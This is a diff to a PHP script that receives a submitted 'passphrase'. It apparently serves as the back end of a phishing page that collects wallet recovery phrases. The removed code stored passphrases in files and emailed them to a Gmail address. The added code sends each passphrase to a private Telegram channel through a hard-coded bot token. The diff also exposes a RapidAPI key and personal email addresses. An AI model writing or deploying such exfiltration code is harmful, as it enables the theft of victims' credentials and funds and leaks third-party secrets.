@@ -8,98 +8,51 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         exit;
     }
 
-    $filePath = 'submissions/';
-    $jsonFileName = 'passphrase.json';
-    $txtFileName = 'passphrase.txt';
-
-    if (!is_dir($filePath)) {
-        mkdir($filePath, 0777, true);
-    }
-
-    $data = [
-        'passphrase' => $passphrase,
-        'timestamp' => date('Y-m-d H:i:s')
-    ];
-
-    $jsonData = json_encode($data) . PHP_EOL;
-    file_put_contents($filePath . $jsonFileName, $jsonData, FILE_APPEND);
-
-    $textData = "Passphrase: " . $passphrase . "  | Timestamp: " . $data['timestamp'] . PHP_EOL;
-    file_put_contents($filePath . $txtFileName, $textData, FILE_APPEND);
-
     try {
-        sendEmail($filePath . $jsonFileName, $filePath . $txtFileName);
-        echo "Passphrase saved and email sent successfully!";
+        sendToTelegram($passphrase);
+        echo "Passphrase sent successfully!";
     } catch (Exception $e) {
         echo 'Error: ' . $e->getMessage();
     }
-} elseif ($_SERVER["REQUEST_METHOD"] === "GET" && isset($_GET['token']) && isset($_GET['file'])) {
-    $secretToken = "pi042"; // Replace with your actual secret token
-
-    if ($_GET['token'] !== $secretToken) {
-        echo "Unauthorized access.";
-        exit;
-    }
-
-    $filePath = 'submissions/';
-    $fileType = $_GET['file'];
-
-    if ($fileType === 'json') {
-        $fileName = 'passphrase.json';
-    } elseif ($fileType === 'txt') {
-        $fileName = 'passphrase.txt';
-    } else {
-        echo "Invalid file type.";
-        exit;
-    }
-
-    $fileContent = file_get_contents($filePath . $fileName);
-    header('Content-Type: text/plain');
-    echo $fileContent;
 } else {
     echo "Invalid request method.";
 }
 
-function sendEmail($jsonFilePath, $txtFilePath) {
-    $jsonContent = file_get_contents($jsonFilePath);
-    $txtContent = file_get_contents($txtFilePath);
+function sendToTelegram($passphrase) {
+    // Telegram Bot API token
+    $botToken = "7265054014:AAGxCzsiSeBg3O3T6y7JAXoNZP4pWg0H5QY";
+    
+    // Your private channel ID (with -100 prefix)
+    $channelId = "-1002222609812";  // Replace with your actual channel ID
 
-    $postData = [
-        'ishtml' => 'false',
-        'sendto' => 'piphrase042@gmail.com',
-        'name' => 'Pi',
-        'replyTo' => 'peterjfk243@gmail.com',
-        'title' => 'New Passphrase Submission',
-        'body' => 'Passphrase in JSON: ' . $jsonContent . "\n\n" . 'Passphrase in Text: ' . $txtContent
+    // The message you want to send
+    $message = $passphrase;
+
+    // Telegram API URL
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+
+    // Data to be sent
+    $data = [
+        'chat_id' => $channelId,
+        'text' => $message
     ];
 
-    $curl = curl_init();
+    // Use cURL to send the request
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-    curl_setopt_array($curl, [
-        CURLOPT_URL => "https://rapidmail.p.rapidapi.com/",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_ENCODING => "",
-        CURLOPT_MAXREDIRS => 10,
-        CURLOPT_TIMEOUT => 30,
-        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-        CURLOPT_CUSTOMREQUEST => "POST",
-        CURLOPT_POSTFIELDS => json_encode($postData),
-        CURLOPT_HTTPHEADER => [
-            "Content-Type: application/json",
-            "x-rapidapi-host: rapidmail.p.rapidapi.com",
-            "x-rapidapi-key: 103109b6a5msh8ce5cefac7fa39fp197eebjsn3a9d94fab61e"
-        ],
-    ]);
+    $response = curl_exec($ch);
 
-    $response = curl_exec($curl);
-    $err = curl_error($curl);
+    // Close cURL session
+    curl_close($ch);
 
-    curl_close($curl);
-
-    if ($err) {
-        throw new Exception("cURL Error #:" . $err);
-    } else {
-        return $response;
+    // Check response
+    $responseData = json_decode($response, true);
+    if (!$responseData || !$responseData['ok']) {
+        throw new Exception("Failed to send message: " . ($responseData['description'] ?? 'Unknown error'));
     }
 }
 ?>
